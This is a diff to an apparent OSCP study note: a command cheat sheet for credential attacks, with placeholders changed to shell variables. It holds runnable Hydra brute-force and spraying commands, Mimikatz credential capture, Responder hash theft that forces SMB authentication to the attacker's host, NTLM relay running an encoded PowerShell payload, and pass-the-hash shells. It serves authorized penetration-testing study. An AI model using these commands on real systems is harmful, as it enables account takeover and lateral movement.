@@ -8,18 +8,18 @@ Part of [[COMMAND APPENDIX]]. Syntax-first reference for credential-related tool
 
 ```bash
 # SSH dictionary attack, non-standard port
-hydra -l <user> -P /usr/share/wordlists/rockyou.txt -s <port> ssh://<target>
+hydra -l $Username -P /usr/share/wordlists/rockyou.txt -s $Port ssh://$BoxIP
 
 # RDP password spray (one password, many usernames -- stays under lockout threshold)
-hydra -L users.txt -p "<password>" rdp://<target>
+hydra -L users.txt -p "$Password" rdp://$BoxIP
 
 # HTTP POST form attack (get field names + failure string from Burp first)
 # Three colon-separated fields: path : POST body with ^PASS^ : failure indicator
-hydra -l <user> -P /usr/share/wordlists/rockyou.txt <target> \
-  http-post-form "/<path>:<fieldname>=^PASS^:<failure-string>"
+hydra -l $Username -P /usr/share/wordlists/rockyou.txt $BoxIP \
+  http-post-form "/$BoxDir:<fieldname>=^PASS^:<failure-string>"
 
 # HTTP basic auth (WWW-Authenticate: Basic -- fastest Hydra target, no redirect)
-hydra -l <user> -P /usr/share/wordlists/rockyou.txt http-get://<target>/
+hydra -l $Username -P /usr/share/wordlists/rockyou.txt http-get://$BoxIP/
 
 # RDP limits to 4 parallel tasks (-t 4); SSH defaults to 16
 
@@ -38,10 +38,10 @@ Key flags:
 | Flag | Meaning |
 |---|---|
 | `-l <name>` | Single username |
-| `-L <file>` | Username list |
-| `-p <pass>` | Single password |
-| `-P <file>` | Password list |
-| `-s <port>` | Non-standard port |
+| `-L $BoxDir` | Username list |
+| `-p $Password` | Single password |
+| `-P $BoxDir` | Password list |
+| `-s $Port` | Non-standard port |
 | `-t <n>` | Parallel tasks |
 | `-I` | Skip restore file (force restart) |
 
@@ -178,7 +178,7 @@ misc::memssp              # Hook SSPI layer; credentials captured to C:\Windows\
 type C:\Windows\System32\mimilsa.log
 ```
 
-> On Windows Server 2022: `lsadump::sam` fails even with a SYSTEM impersonation token because Windows checks the PRIMARY process token, not the thread token. Fix: run Mimikatz via `schtasks /ru <adminuser> /rp <password>` so the admin's token IS the primary token. See [[16. Password Attacks#16.3.2. Passing NTLM|16.3.2 lab section]] for the full schtask command.
+> On Windows Server 2022: `lsadump::sam` fails even with a SYSTEM impersonation token because Windows checks the PRIMARY process token, not the thread token. Fix: run Mimikatz via `schtasks /ru $Username /rp $Password` so the admin's token IS the primary token. See [[16. Password Attacks#16.3.2. Passing NTLM|16.3.2 lab section]] for the full schtask command.
 
 🔁 [[16. Password Attacks#16.3.1. Cracking NTLM|16.3.1]], [[16. Password Attacks#16.3.2. Passing NTLM|16.3.2]], [[16. Password Attacks#16.3.5. Windows Credential Guard|16.3.5]]
 
@@ -191,10 +191,10 @@ type C:\Windows\System32\mimilsa.log
 sudo responder -I tun0
 
 # From a foothold on the victim: force an outbound SMB auth to Kali
-dir \\<kali-ip>\test    # "Access is denied" is expected -- hash is still captured
+dir \\$LocalIP\test    # "Access is denied" is expected -- hash is still captured
 
 # Captured hash format:
-# <user>::<domain>:<challenge>:<response>:<blob>
+# $Username::$Domain:<challenge>:<response>:<blob>
 # Save the full line to a file, then crack with hashcat -m 5600
 ```
 
@@ -207,7 +207,7 @@ dir \\<kali-ip>\test    # "Access is denied" is expected -- hash is still captur
 ```bash
 # Relay intercepted SMB auth to a second target and execute a command
 impacket-ntlmrelayx --no-http-server -smb2support \
-  -t <relay-target-ip> \
+  -t $BoxIP \
   -c "powershell -enc <UTF-16LE-base64-payload>"
 
 # Generate UTF-16LE base64 for PowerShell -enc (can't use pwsh on Linux for nested quotes)
@@ -231,13 +231,13 @@ Constraint: the relayed user must have local admin on the relay target. The rela
 
 ```bash
 # Get an interactive SYSTEM shell via PtH (psexec always gives SYSTEM)
-impacket-psexec -hashes 00000000000000000000000000000000:<NThash> Administrator@<target>
+impacket-psexec -hashes 00000000000000000000000000000000:$AdminHash Administrator@$BoxIP
 
 # Get a shell as the authenticated user (wmiexec -- no file drop to disk)
-impacket-wmiexec -hashes 00000000000000000000000000000000:<NThash> Administrator@<target>
+impacket-wmiexec -hashes 00000000000000000000000000000000:$AdminHash Administrator@$BoxIP
 
 # Access an SMB share without a plaintext password
-smbclient \\\\<target>\\<share> -U Administrator --pw-nt-hash <NThash>
+smbclient \\\\$BoxIP\\$BoxName -U Administrator --pw-nt-hash $AdminHash
 ```
 
 The LM hash portion is always 32 zeros on modern Windows (LM disabled since Vista/2008). Format: `LMhash:NThash`.
@@ -580,3 +580,14 @@ grep -E '^.{6,}$' jane.txt \
 - [RevShells](https://www.revshells.com/) for shell payload selection
 - [CyberChef](https://gchq.github.io/CyberChef/) for encoding and decoding
 - [ippsec.rocks](https://ippsec.rocks/) for technique walkthrough searches
+## Why this matters for OSCP
+
+This page turns one repeatable part of an authorized assessment into a checklist you can apply under exam time pressure.
+
+## Related Modules
+
+- [[MODULES/16. Password Attacks]] -- module concepts used by this hub page
+
+## Demonstrated in box write-ups
+
+- [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- demonstrates the workflow described here
